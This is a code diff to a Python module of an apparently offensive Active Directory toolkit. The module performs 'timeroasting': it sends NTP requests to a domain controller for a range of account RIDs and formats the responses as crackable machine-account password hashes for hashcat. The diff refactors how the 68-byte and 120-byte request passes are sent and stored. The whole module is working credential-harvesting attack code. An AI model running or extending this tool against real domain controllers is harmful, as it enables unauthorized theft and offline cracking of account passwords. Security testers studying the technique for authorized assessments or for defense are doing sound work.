@@ -11,20 +11,19 @@ Two packet formats, two hash algorithms::
     68-byte  Authenticator        → MD5(NTOWFv1 || salt)        → hashcat 31300
     120-byte ExtendedAuthenticator → KDF+HMAC-SHA512(NTOWFv1, ...) → no hashcat yet
 
-Code flow (--format both --password both = 4 packets per RID)::
+Code flow::
 
     timeroast()                        ← public entry point
       │
-      ├─ password="current" or "both"
-      │    └─ _send_for_format(fmt, old_pwd=False)
-      │         ├─ fmt="auth":     ntp_roast(extended=False)  → 68B MD5
-      │         ├─ fmt="extended": ntp_roast(extended=True)   → 120B SHA512
-      │         └─ fmt="both":     ntp_roast(extended=False)  → 68B MD5
-      │                            + ntp_roast(extended=True)  → 120B SHA512
+      ├─ 68-byte requests (--format auth or both)
+      │    ├─ --password current or both:  ntp_roast(old_pwd=False)  → results.current
+      │    └─ --password previous or both: ntp_roast(old_pwd=True)   → results.previous
+      │         (bit 31 set in the Key Identifier)
       │
-      ├─ password="previous" or "both"
-      │    └─ _send_for_format(fmt, old_pwd=True)
-      │         (same structure, all RIDs, bit 31 set in 68B Key Identifier)
+      ├─ 120-byte requests (--format extended or both)
+      │    └─ ntp_roast(extended=True), once                         → results.extended
+      │         (this format has no working password selector, so
+      │          --password does not apply to it)
       │
       └─ _responses_to_results()       Format NtpResponse → RoastResult
            ├─ 68-byte:  format_sntp_hash()       → $sntp-ms$hash$salt
@@ -34,8 +33,9 @@ Code flow (--format both --password both = 4 packets per RID)::
 from __future__ import annotations
 
 import logging
+from collections.abc import Iterator
 from dataclasses import dataclass, field
-from typing import TYPE_CHECKING
+from typing import TYPE_CHECKING, Any
 
 from kerbwolf.core.ntp import NtpResponse, ntp_roast
 from kerbwolf.hashcat import format_sntp_hash, format_sntp_sha512_hash
@@ -56,12 +56,12 @@ _log = logging.getLogger(__name__)
 
 @dataclass
 class TimeroastResults:
-    """Results from a timeroasting run, split by password age.
+    """Results from a timeroasting run.
 
-    ``current`` and ``previous`` each contain a flat list of RoastResult
-    objects.  Each result's ``hash_string`` starts with ``$sntp-ms$`` (MD5)
-    or ``$sntp-ms-sha512$`` (KDF+HMAC-SHA512) depending on the packet
-    format the DC responded with.
+    ``current`` and ``previous`` hold the 68-byte (``$sntp-ms$``, MD5)
+    hashes for the current and the previous password.  ``extended`` holds
+    the 120-byte (``$sntp-ms-sha512$``) hashes: that format cannot select
+    which password the DC answers with, so they are not split by age.
 
     When LDAP accounts are provided, ``username`` is set to the
     sAMAccountName instead of a bare RID string.
@@ -69,6 +69,7 @@ class TimeroastResults:
 
     current: list[RoastResult] = field(default_factory=list)
     previous: list[RoastResult] = field(default_factory=list)
+    extended: list[RoastResult] = field(default_factory=list)
 
 
 # ---------------------------------------------------------------------------
@@ -127,37 +128,6 @@ def _responses_to_results(
 # ---------------------------------------------------------------------------
 
 
-def _send_for_format(
-    *,
-    dc_ip: str,
-    rids: Iterable[int],
-    rate: int,
-    timeout: float,
-    src_port: int,
-    port: int,
-    old_pwd: bool,
-    fmt: str,
-) -> list[NtpResponse]:
-    """Send NTP probes for the requested format and return raw responses.
-
-    - ``auth``:     Send 68-byte packets for all RIDs.
-    - ``extended``: Send 120-byte packets for all RIDs.
-    - ``both``:     Send 68-byte for all RIDs, then 120-byte for all RIDs.
-    """
-    kwargs = {"rate": rate, "timeout": timeout, "old_pwd": old_pwd, "src_port": src_port, "port": port}
-
-    if fmt == "auth":
-        return ntp_roast(dc_ip, rids, extended=False, **kwargs)
-
-    if fmt == "extended":
-        return ntp_roast(dc_ip, rids, extended=True, **kwargs)
-
-    # fmt="both": 68-byte for all RIDs, then 120-byte for all RIDs
-    auth_results = ntp_roast(dc_ip, rids, extended=False, **kwargs)
-    ext_results = ntp_roast(dc_ip, rids, extended=True, **kwargs)
-    return auth_results + ext_results
-
-
 # ---------------------------------------------------------------------------
 # Public entry point
 # ---------------------------------------------------------------------------
@@ -166,6 +136,8 @@ def _send_for_format(
 _MODE_CURRENT = "current"
 _MODE_PREVIOUS = "previous"
 _MODE_BOTH = "both"
+_FMT_AUTH = "auth"
+_FMT_EXTENDED = "extended"
 
 
 def timeroast(
@@ -189,19 +161,15 @@ def timeroast(
       RIDs are extracted from accounts, and sAMAccountNames are used as labels.
     - Neither: defaults to RIDs 500-10000.
 
-    Password passes:
+    68-byte requests (``fmt`` ``auth`` or ``both``):
 
     - ``current``:  One pass with old_pwd=False.
     - ``previous``: One pass with old_pwd=True.
     - ``both``:     Current pass for all RIDs, then previous pass for all RIDs.
 
-    Format passes:
-
-    - ``auth``:     68-byte Authenticator (MD5, hashcat 31300).
-    - ``extended``: 120-byte ExtendedAuthenticator (KDF+HMAC-SHA512).
-    - ``both``:     68-byte for all RIDs, then 120-byte for all RIDs.
-
-    Combining ``--password both --format both`` sends 4 packets per RID.
+    120-byte requests (``fmt`` ``extended`` or ``both``) are sent once,
+    whatever *password* is: the request cannot select the password, so a
+    second pass would repeat the first byte for byte.
 
     """
     # Build RID list and optional name mapping from accounts or rids.
@@ -212,21 +180,25 @@ def timeroast(
     elif rids is None:
         rids = range(500, 10001)
 
-    # Materialize iterators when multiple passes will consume the same RIDs.
-    if _MODE_BOTH in (password, fmt):
+    # A one-shot iterator has to be stored to be walked more than once.
+    # Ranges and lists are walked again as they are, so an open-ended
+    # range is never built in memory.
+    if isinstance(rids, Iterator):
         rids = list(rids)
 
-    roast_kwargs = {"dc_ip": dc_ip, "rate": rate, "timeout": timeout, "src_port": src_port, "port": port, "fmt": fmt}
+    roast_kwargs: dict[str, Any] = {"rate": rate, "timeout": timeout, "src_port": src_port, "port": port}
     results = TimeroastResults()
 
-    # --- Pass 1: current password ---
-    if password in (_MODE_CURRENT, _MODE_BOTH):
-        raw = _send_for_format(rids=rids, old_pwd=False, **roast_kwargs)
-        results.current = _responses_to_results(raw, rid_to_name)
+    if fmt in (_FMT_AUTH, _MODE_BOTH):
+        if password in (_MODE_CURRENT, _MODE_BOTH):
+            raw = ntp_roast(dc_ip, rids, extended=False, old_pwd=False, **roast_kwargs)
+            results.current = _responses_to_results(raw, rid_to_name)
+        if password in (_MODE_PREVIOUS, _MODE_BOTH):
+            raw = ntp_roast(dc_ip, rids, extended=False, old_pwd=True, **roast_kwargs)
+            results.previous = _responses_to_results(raw, rid_to_name)
 
-    # --- Pass 2: previous password ---
-    if password in (_MODE_PREVIOUS, _MODE_BOTH):
-        raw = _send_for_format(rids=rids, old_pwd=True, **roast_kwargs)
-        results.previous = _responses_to_results(raw, rid_to_name)
+    if fmt in (_FMT_EXTENDED, _MODE_BOTH):
+        raw = ntp_roast(dc_ip, rids, extended=True, old_pwd=False, **roast_kwargs)
+        results.extended = _responses_to_results(raw, rid_to_name)
 
     return results
